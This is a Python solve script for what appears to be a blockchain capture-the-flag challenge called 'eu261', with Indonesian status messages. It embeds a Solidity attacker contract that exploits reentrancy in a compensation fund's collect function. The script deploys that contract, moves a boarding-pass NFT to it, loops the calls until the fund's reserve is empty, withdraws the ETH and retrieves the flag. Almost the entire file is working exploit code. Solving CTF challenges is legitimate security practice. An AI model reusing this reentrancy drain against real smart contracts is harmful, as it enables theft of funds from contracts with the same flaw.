#!/usr/bin/env python3

import json
import os
import re
import socket
import ssl
from pathlib import Path

from eth_account import Account
from solcx import compile_standard, get_installed_solc_versions, install_solc, set_solc_version
from web3 import Web3


BASE_DIR = Path(__file__).resolve().parent
LAUNCHER_HOST = os.environ.get("HOST", "eu261-ba7cf45d7b86.chall.nnsc.tf")
LAUNCHER_PORT = int(os.environ.get("PORT", "1337"))
SOLC_VERSION = "0.8.36"

ATTACKER_SOURCE = """
// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

interface ICompensationFund {
    function collect(uint256 fundId, uint256 passId) external;
}

contract Attacker {
    ICompensationFund public immutable fund;
    address public immutable owner;
    uint256 public immutable fundId;
    uint256 public immutable passId;
    uint256 public remaining;

    constructor(address _fund, uint256 _fundId, uint256 _passId) {
        fund = ICompensationFund(_fund);
        owner = msg.sender;
        fundId = _fundId;
        passId = _passId;
    }

    function begin(uint256 loops) external {
        require(msg.sender == owner, "only owner");
        remaining = loops;
        fund.collect(fundId, passId);
    }

    receive() external payable {
        if (remaining > 1) {
            unchecked {
                remaining--;
            }
            fund.collect(fundId, passId);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "only owner");
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "withdraw failed");
    }
}
"""


def launcher_request(action: str) -> str:
    context = ssl.create_default_context()
    with socket.create_connection((LAUNCHER_HOST, LAUNCHER_PORT), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname=LAUNCHER_HOST) as tls:
            data = b""
            while b"action? " not in data:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                data += chunk
            tls.sendall(action.encode() + b"\n")
            response = b""
            while True:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                response += chunk
    return response.decode("utf-8", "replace")


def get_instance() -> tuple[str, str, str]:
    response = launcher_request("1")
    rpc = re.search(r"rpc endpoint:\s+(https?://\S+)", response)
    key = re.search(r"private key:\s+(0x[0-9a-fA-F]+)", response)
    challenge = re.search(r"challenge contract:\s+(0x[0-9a-fA-F]+)", response)
    if not (rpc and key and challenge):
        raise RuntimeError(f"gagal parse instance info:\n{response}")
    return rpc.group(1), key.group(1), Web3.to_checksum_address(challenge.group(1))


def ensure_solc() -> None:
    installed = {str(version) for version in get_installed_solc_versions()}
    if SOLC_VERSION not in installed:
        install_solc(SOLC_VERSION)
    set_solc_version(SOLC_VERSION)


def compile_contracts() -> dict:
    ensure_solc()
    sources = {
        "src/BoardingPass.sol": {"content": (BASE_DIR / "src/BoardingPass.sol").read_text()},
        "src/eu261.sol": {"content": (BASE_DIR / "src/eu261.sol").read_text()},
        "Attacker.sol": {"content": ATTACKER_SOURCE},
    }
    return compile_standard(
        {
            "language": "Solidity",
            "sources": sources,
            "settings": {"outputSelection": {"*": {"*": ["abi", "evm.bytecode.object"]}}},
        }
    )


def send_transaction(w3: Web3, account: Account, tx: dict) -> dict:
    nonce = w3.eth.get_transaction_count(account.address)
    tx_full = {
        "from": account.address,
        "nonce": nonce,
        "chainId": w3.eth.chain_id,
        **tx,
    }
    if "maxFeePerGas" not in tx_full and "maxPriorityFeePerGas" not in tx_full and "gasPrice" not in tx_full:
        tx_full["gasPrice"] = w3.eth.gas_price
    signed = account.sign_transaction(tx_full)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)


def main() -> None:
    rpc_url, private_key, challenge_addr = get_instance()
    compiled = compile_contracts()

    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if not w3.is_connected():
        raise RuntimeError(f"gagal connect RPC: {rpc_url}")

    account = Account.from_key(private_key)
    fund_abi = compiled["contracts"]["src/eu261.sol"]["CompensationFund"]["abi"]
    pass_abi = compiled["contracts"]["src/BoardingPass.sol"]["BoardingPass"]["abi"]
    attacker_abi = compiled["contracts"]["Attacker.sol"]["Attacker"]["abi"]
    attacker_bin = compiled["contracts"]["Attacker.sol"]["Attacker"]["evm"]["bytecode"]["object"]

    fund = w3.eth.contract(address=challenge_addr, abi=fund_abi)
    pass_addr = Web3.to_checksum_address(fund.functions.boardingPass().call())
    boarding_pass = w3.eth.contract(address=pass_addr, abi=pass_abi)

    fund_id = 0
    pass_id = 0
    reserve = fund.functions.reserve().call()
    compensation = fund.functions.compensationOf(fund_id).call()
    loops = reserve // compensation
    if loops * compensation != reserve:
        raise RuntimeError(f"reserve tidak habis dibagi compensation: {reserve=} {compensation=}")

    print(f"[+] player           : {account.address}")
    print(f"[+] challenge        : {challenge_addr}")
    print(f"[+] boarding pass    : {pass_addr}")
    print(f"[+] reserve          : {w3.from_wei(reserve, 'ether')} ETH")
    print(f"[+] compensation     : {w3.from_wei(compensation, 'ether')} ETH")
    print(f"[+] reentry count    : {loops}")

    if fund.functions.isSolved().call():
        print("[+] instance sudah solved, ambil flag langsung")
        flag_response = launcher_request("2")
        match = re.search(r"([A-Za-z0-9_]+\{[^\n}]+\})", flag_response)
        if match:
            print(f"<FLAG>{match.group(1)}</FLAG>")
            return
        cleaned = flag_response.strip()
        if cleaned:
            print(cleaned)
        raise RuntimeError(f"flag tidak ditemukan di output launcher: {cleaned!r}")

    attacker_factory = w3.eth.contract(abi=attacker_abi, bytecode=attacker_bin)
    deploy_tx = attacker_factory.constructor(challenge_addr, fund_id, pass_id).build_transaction(
        {"from": account.address, "gas": 800000}
    )
    deploy_receipt = send_transaction(w3, account, deploy_tx)
    attacker_addr = deploy_receipt["contractAddress"]
    attacker = w3.eth.contract(address=attacker_addr, abi=attacker_abi)
    print(f"[+] attacker         : {attacker_addr}")

    owner = boarding_pass.functions.ownerOf(pass_id).call()
    if owner.lower() != account.address.lower():
        raise RuntimeError(f"boarding pass {pass_id} bukan milik player: {owner}")

    transfer_tx = boarding_pass.functions.transferFrom(
        account.address, attacker_addr, pass_id
    ).build_transaction({"from": account.address, "gas": 200000})
    send_transaction(w3, account, transfer_tx)
    print("[+] boarding pass dipindah ke attacker")

    attack_tx = attacker.functions.begin(loops).build_transaction({"from": account.address, "gas": 4000000})
    send_transaction(w3, account, attack_tx)
    print("[+] reentrancy selesai")

    withdraw_tx = attacker.functions.withdraw().build_transaction({"from": account.address, "gas": 200000})
    send_transaction(w3, account, withdraw_tx)
    print("[+] saldo attacker ditarik ke EOA")

    remaining = fund.functions.reserve().call()
    solved = fund.functions.isSolved().call()
    print(f"[+] reserve setelah exploit: {w3.from_wei(remaining, 'ether')} ETH")
    print(f"[+] solved                 : {solved}")
    if not solved:
        raise RuntimeError("challenge belum solved")

    flag_response = launcher_request("2")
    match = re.search(r"([A-Za-z0-9_]+\{[^\n}]+\})", flag_response)
    if match:
        print(f"<FLAG>{match.group(1)}</FLAG>")
        return

    cleaned = flag_response.strip()
    if cleaned:
        print(cleaned)
    raise RuntimeError(f"flag tidak ditemukan di output launcher: {cleaned!r}")


if __name__ == "__main__":
    main()
